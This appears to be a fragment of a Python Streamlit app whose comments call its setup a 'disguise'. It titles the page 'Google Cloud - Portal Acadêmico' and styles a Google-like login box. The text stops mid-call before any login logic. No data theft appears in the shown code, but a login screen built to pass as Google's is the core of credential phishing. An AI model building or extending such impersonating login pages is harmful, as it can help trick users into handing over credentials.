import streamlit as st
import time

# 1. CONFIGURAÇÃO DE DISFARCE
st.set_page_config(page_title="Google Cloud - Portal Acadêmico", page_icon="☁️", layout="wide")

# Interface visual estilo Google
st.markdown("""
    <style>
    .main { background-color: #ffffff; }
    .stTextInput>div>div>input { border-radius: 4px; border: 1px solid #dfe1e5; }
    .login-box { 
        border: 1px solid #dadce0; padding: 40px; border-radius: 8px; 
        max-width: 450px; margin: auto; text-align: center;
    }
    .google-logo { width: 75px; margin-bottom: 10px; }
    </style>
    """, unsafe_allow_html=True)

# 2. SISTEMA DE STORAGE (PERSISTÊNCIA TOTAL NA SESSÃO)
# Isso garante que os arquivos NÃO sumam com o F5
if 'biblioteca_nuvem' not in st.session_state:
    st.session_state['biblioteca_nuvem'] = []

if 'logado' not in st.session_state:
    st.session_state['logado'] = False
    st.session_state['email_usuario'] = ""

# 3. TELA DE LOGIN "DISFARCE GOOGLE"
if not st.session_state['logado']:
    st.write("#") # Espaçamento
    with st.container():
        st.markdown(
            
